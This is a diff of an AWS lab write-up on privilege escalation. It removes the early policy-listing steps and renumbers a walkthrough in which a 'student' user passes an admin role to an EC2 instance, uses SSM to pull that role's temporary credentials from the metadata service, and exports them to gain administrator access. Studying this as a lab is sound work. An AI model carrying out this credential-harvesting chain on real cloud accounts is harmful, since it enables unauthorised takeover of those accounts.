@@ -6,76 +6,9 @@ Objective: Leverage the policy attached to the student user and attain administr
 
 ----
 
-1. Get access to AWS lab credentials.
-2. Configure AWS CLI.
-3. List the policies and the inline policies attached to the `student` user:
+The `student` user can `PassRole` on any resource as well as has control over EC2 instances and SSM (AWS Systems Manager). Hence, the user can pass a role to an EC2 instance and run it. via SSM
 
-```text
-┌──(kali㉿kali)-[~]
-└─$ aws iam list-attached-user-policies --user-name student
-{
-    "AttachedPolicies": [
-        {
-            "PolicyName": "AmazonEC2ReadOnlyAccess",
-            "PolicyArn": "arn:aws:iam::aws:policy/AmazonEC2ReadOnlyAccess"
-        },
-        {
-            "PolicyName": "IAMReadOnlyAccess",
-            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
-        }
-    ]
-}
-                                                                                                         
-┌──(kali㉿kali)-[~]
-└─$ aws iam list-user-policies --user-name student
-{
-    "PolicyNames": [
-        "ConfigureEC2Role"
-    ]
-}
-```
-
-4. Try creating a user on the AWS account:
-
-```text
-┌──(kali㉿kali)-[~]
-└─$ aws iam create-user --user-name Bob
-
-An error occurred (AccessDenied) when calling the CreateUser operation: User: arn:aws:iam::079386327979:user/student is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::079386327979:user/Bob because no identity-based policy allows the iam:CreateUser action
-```
-
-User creation failed due to insufficient privileges.
-
-5. Check the policy permissions and details:
-
-```text
-┌──(kali㉿kali)-[~]
-└─$ aws iam get-user-policy --user-name student --policy-name ConfigureEC2Role
-{
-    "UserName": "student",
-    "PolicyName": "ConfigureEC2Role",
-    "PolicyDocument": {
-        "Version": "2012-10-17",
-        "Statement": [
-            {
-                "Effect": "Allow",
-                "Action": [
-                    "iam:PassRole",
-                    "ec2:RunInstances",
-                    "ec2:Describe*",
-                    "ec2:TerminateInstances",
-                    "ssm:*"
-                ],
-                "Resource": "*"
-            }
-        ]
-    }
-}
-```
-
-The `student` user can run EC2 instances and pass a role to the EC2 instance. Since the `student` user also has permission to interact with the SSM service, the student user can execute commands on the EC2 instances via SSM.
-
-6. List role on AWS account which can be passed to EC2 service:
+1. List role on AWS account which can be passed to EC2 service:
 
 ```text
 ┌──(kali㉿kali)-[~]
@@ -108,7 +41,7 @@ The `student` user can run EC2 instances and pass a role to the EC2 instance. Si
 }
 ```
 
-7. Check `ec2admin` role policies and permissions:
+2. Check `ec2admin` role policies and permissions:
 
 ```text
 ┌──(kali㉿kali)-[~]
@@ -120,7 +53,7 @@ The `student` user can run EC2 instances and pass a role to the EC2 instance. Si
 }
 ```
 
-8. Check policy permissions:
+3. Check policy permissions:
 
 ```text
 ┌──(kali㉿kali)-[~]
@@ -143,7 +76,7 @@ The `student` user can run EC2 instances and pass a role to the EC2 instance. Si
 
 The `ec2admin` role allows `AdministratorAccess` on the AWS account.
 
-9. Find AMI id for Amazon Linux 2 AMI:
+4. Find AMI id for Amazon Linux 2 AMI:
 
 ```text
 ┌──(kali㉿kali)-[~]
@@ -153,7 +86,7 @@ ami-00f1dd92f5c4956da
 
 The AMI id is ami-00f1dd92f5c4956da
 
-10. Check the subnets available in the AWS account:
+5. Check the subnets available in the AWS account:
 
 ```text
 ┌──(kali㉿kali)-[~]
@@ -189,7 +122,7 @@ The AMI id is ami-00f1dd92f5c4956da
 
 Make a note of `SubnetId`.
 
-11. Check security groups for ec2 service:
+6. Check security groups for ec2 service:
 
 ```text
 ┌──(kali㉿kali)-[~]
@@ -236,7 +169,7 @@ Make a note of `SubnetId`.
 
 Make a note of the security group id.
 
-12. List instance profiles for the AWS account:
+7. List instance profiles for the AWS account:
 
 ```text
 ┌──(kali㉿kali)-[~]
@@ -277,7 +210,7 @@ Make a note of the security group id.
 
 Make a note of the ec2 instance profile name.
 
-13. Start an ec2 instance using collected details:
+8. Start an ec2 instance using collected details:
 
 ```text
 ┌──(kali㉿kali)-[~]
@@ -405,7 +338,7 @@ Make a note of the ec2 instance profile name.
 }
 ```
 
-14. Run commands on the remote ec2 instance using SSM:
+9. Run commands on the remote ec2 instance using SSM:
 
 ```text
 ┌──(kali㉿kali)-[~]
@@ -465,7 +398,7 @@ Make a note of the ec2 instance profile name.
 
 Make a note of command id. The executed command will interact with the metadata service and print out the temporary access credentials of the role associated with the EC2 instance.
 
-15. Get the command’s output using SSM:
+10. Get the command’s output using SSM:
 
 ```text
 ┌──(kali㉿kali)-[~]
@@ -496,7 +429,7 @@ Make a note of command id. The executed command will interact with the metadata 
 
 Command execution is successful. Make a note of Access keys and session tokens.
 
-16. Note down access keys from the command output and assume the ec2admin role by
+11. Note down access keys from the command output and assume the ec2admin role by
 exporting access key id, secret access key, and session token as environment variables:
 
 ```text
@@ -505,7 +438,7 @@ export AWS_SECRET_ACCESS_KEY=<secret access key>
 export AWS_SESSION_TOKEN=<session token>
 ```
 
-17. Check caller identity to confirm whether assuming role was successful:
+12. Check caller identity to confirm whether assuming role was successful:
 
 ```text
 ┌──(kali㉿kali)-[~]
@@ -513,7 +446,7 @@ export AWS_SESSION_TOKEN=<session token>
 ```
 Role assumed successfully.
 
-18. Try creating a new user on the AWS account to verify Administrative privileges:
+13. Try creating a new user on the AWS account to verify Administrative privileges:
 
 ```text
 ┌──(kali㉿kali)-[~]
